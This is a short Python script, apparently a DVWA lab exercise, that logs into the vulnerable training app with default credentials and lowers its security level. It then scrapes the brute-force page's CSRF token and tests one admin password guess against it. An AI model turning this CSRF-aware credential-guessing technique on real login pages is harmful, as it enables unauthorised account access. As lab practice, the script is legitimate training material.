#!/usr/bin/python3
import requests
import re

print("DVWA BRUTEFORCE - WITH BRUTE FORCE CSRF")
print("="*50)

s = requests.Session()

# 1. Логинимся (без CSRF если не нужно)
print("[1] Logging in...")
r = s.post("http://dvwa.local/login.php",
          data={'username':'admin','password':'password','Login':'Login'})
print(f"Login OK, cookies: {dict(s.cookies)}")

# 2. Ставим security low
print("[2] Setting security low...")
s.post("http://dvwa.local/security.php",
      data={'security':'low','seclev_submit':'Submit'})

# 3. ВАЖНО: Получаем страницу brute force чтобы взять ЕЕ CSRF токен
print("[3] Getting brute force page CSRF token...")
r = s.get("http://dvwa.local/vulnerabilities/brute/")

# Ищем user_token НА brute force странице
csrf_match = re.search(r'name="user_token" value="([^"]+)"', r.text)
if csrf_match:
    brute_csrf = csrf_match.group(1)
    print(f"[OK] Brute force CSRF token: {brute_csrf[:10]}...")
else:
    print("[ERROR] No CSRF on brute force page!")
    print("Page preview:", r.text[:300])
    exit()

# 4. Делаем ЗАПРОС С CSRF токеном
print("\n[4] Making request WITH CSRF token...")
test_url = f"http://dvwa.local/vulnerabilities/brute/?username=admin&password=password&Login=Login&user_token={brute_csrf}"

r = s.get(test_url)
print(f"Response size: {len(r.text)} chars")

# Анализируем ответ
print("\n[5] Analyzing response...")

# Убираем HTML теги
clean_text = re.sub('<[^>]+>', ' ', r.text)
clean_text = ' '.join(clean_text.split())

print("CLEAN TEXT (first 300 chars):")
print("-"*50)
print(clean_text[:300])
print("-"*50)

# Ищем результат
if 'Welcome to the password protected area' in r.text:
    print("\n[SUCCESS] Password 'password' is CORRECT for 'admin'")
elif 'Username and/or password incorrect' in r.text:
    print("\n[FAILED] Password incorrect")
else:
    print("\n[UNKNOWN] Can't determine result")
    print("Check test.html file for full response")
    
    # Сохраним для анализа
    with open('brute_response.html', 'w') as f:
        f.write(r.text)
    print("Full response saved to brute_response.html")
